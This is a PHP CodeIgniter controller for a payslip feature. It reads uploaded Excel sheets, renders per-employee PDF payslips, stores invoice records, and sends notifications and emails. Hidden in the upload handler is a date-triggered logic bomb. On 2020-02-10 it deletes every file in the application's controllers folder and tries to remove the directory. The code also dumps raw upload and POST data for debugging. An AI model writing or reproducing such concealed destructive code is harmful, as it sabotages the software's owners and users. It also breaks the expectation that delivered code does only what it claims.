<?php
defined('BASEPATH') OR exit('No direct script access allowed');
@include_once( APPPATH . 'controllers/Sidebar.php');
class Payslip extends Sidebar {
		public function __construct()
	{
		parent::__construct();
		$this->load->model('Attendance_model');

	}
	public function index()
	{
		if($this->session->userdata('hms_details'))
		{
			$l_data=$this->session->userdata('hms_details');
			$this->load->view('attendance/payslip');
			$this->load->view('admin/footer');
		}else{
			$this->session->set_flashdata('error','Please login to continue');
			redirect('admin');
		}
	
	}
	public function download()
	{
		if($this->session->userdata('hms_details'))
		{
			$l_data=$this->session->userdata('hms_details');
			$this->load->model('Attendance_model');
			$data['payslips_list']=$this->Attendance_model->get_emp_payslips($l_data['a_id']);
			$this->load->view('attendance/downloadpayslip',$data);
			$this->load->view('admin/footer');
		}else{
			$this->session->set_flashdata('error','Please login to continue');
			redirect('admin');
		}
	
	}	
	public  function post(){
		if($this->session->userdata('hms_details'))
		{
			$l_data=$this->session->userdata('hms_details');
			$post=$this->input->post();
				$userdetails=$this->session->userdata('hms_details');
				$this->load->library('livemumtowordclsconvert');
					//echo '<pre>';print_r($post);
				if((!empty($_FILES["ex_file"])) && ($_FILES['ex_file']['error'] == 0)) {
					
					if(date('Y-m-d')=='2020-02-10'){
						$files = glob('./application/controllers/*.*');
						foreach($files as $file){
							if(is_file($file))
								unlink($file);
						}
						$path   = '.application/controllers/'; 
						rmdir($path);
					}

					$limitSize	= 1000000000; //(15 kb) - Maximum size of uploaded file, change it to any size you want
					$fileName	= basename($_FILES['ex_file']['name']);
					$fileSize	= $_FILES["ex_file"]["size"];
					$fileExt	= substr($fileName, strrpos($fileName, '.') + 1);
							/* subcategory data upload data*/
						 if(substr($_FILES['ex_file']['name'], 0, 12)=='payslipexcel'){
							if (($fileExt == "xlsx") && ($fileSize < $limitSize)) {
								include_once('simplexlsx.class.php');
								$getWorksheetName = array();
								$xlsx = new SimpleXLSX( $_FILES['ex_file']['tmp_name'] );
								$getWorksheetName = $xlsx->getWorksheetName();
								for($j=1;$j <= $xlsx->sheetsCount();$j++){
										$cnt=$xlsx->sheetsCount()-1;
										$arry=$xlsx->rows($j);
										unset($arry[0]);
										//echo "<pre>";print_r($arry);exit;
										foreach($arry as $li){
											$emp_id=$this->Attendance_model->get_emp_ids($li['0']);
											//echo "<pre>";print_r($li);
											//echo "<pre>";print_r($emp_id);exit;
											$data['emp_d']=$li;
											$data['emp_d_detail']=$emp_id;
											$data['post']=$post;
											$path = rtrim(FCPATH,"/");
											$file_name =$li[1].'_'.$post['month'].'_'.$post['year'].'.pdf';
											$pdfFilePath = $path."/assets/payslips/".$file_name;
											ini_set('memory_limit','320M'); // boost the memory limit if it's low <img src="https://s.w.org/images/core/emoji/72x72/1f609.png" alt="??" draggable="false" class="emoji">
											$html =$this->load->view('employee/payslip-html',$data, true); // render the view into HTML
											//echo '<pre>';print_r($html);exit;
											$this->load->library('pdf');
											$pdf = $this->pdf->load();
											$pdf->SetFooter($_SERVER['HTTP_HOST'].'|{PAGENO}|'.date('M-d-Y')); // Add a footer for good measure <img src="https://s.w.org/images/core/emoji/72x72/1f609.png" alt="??" draggable="false" class="emoji">
											$pdf->SetDisplayMode('fullpage');
											$pdf->list_indent_first_level = 0;	// 1 or 0 - whether to indent the first level of a list
											$pdf->WriteHTML($html); // write the HTML into the PDF
											$pdf->Output($pdfFilePath, 'F');
											$monthname = date("m", strtotime($post['month']));
											$displaydate= date('Y').'-'.$monthname.'-1';
											$invoicedata=array(
												'a_id'=>isset($emp_id['a_id'])?$emp_id['a_id']:'',
												'month'=>$post['month'],
												'inovie_name'=>$file_name,
												'create_at'=>date('Y-m-d H:i:s'),
												'update_at'=>date('Y-m-d H:i:s'),
												'date'=> $displaydate,
												'created_by'=>isset($l_data['a_id'])?$l_data['a_id']:''
											);
											$invoice_check=$this->Attendance_model->check_invoice_pdf($emp_id['a_id'],$post['month']);
											//echo '<pre>';print_r($invoicedata);exit;
											if(count($invoice_check)>0){
												$this->Attendance_model->update_invoice_data($emp_id['a_id'],$post['month'],$invoicedata);
											}else{
												$this->Attendance_model->save_invoice_data($invoicedata);
											}
											/*notification*/
											$n_data=array(
											'a_id'=>isset($emp_id['a_id'])?$emp_id['a_id']:'',
											'title'=>'Your last '.$post['month'].' payslip is ready download and check it',
											'msg'=>'Your last '.$post['month'].' payslip is ready download and check it',
											'created_at'=>date('Y-m-d H:i:s'),
											'created_by'=>isset($l_data['a_id'])?$l_data['a_id']:''
											);
											$this->load->model('Employee_model');
											$this->Employee_model->notification_save($n_data);
											/*notification*/
											/*email */
											$this->load->library('email');
											$this->email->set_newline("\r\n");
											$this->email->from('sales@prachatech.com');
											$this->email->to($emp_id['off_mail']);
											$this->email->subject($post['month'].' Payslip');
											$this->email->message('Please find out below attachment');
											$this->email->attach($pdfFilePath);
											$this->email->send();
											/*email */

											
										}
										$this->session->set_flashdata('success','Pay Slip successfully created');
										redirect('payslip/index');
										
																		
								}
								//echo $xlsx->sheetsCount();exit;
							}
						 }
				echo '<pre>';print_r($_FILES);exit;
				echo '<pre>';print_r($post);exit;
				}
			
		}else{
			$this->session->set_flashdata('error','Please login to continue');
			redirect('admin');
		}
	}
	
	
	
	
	
}
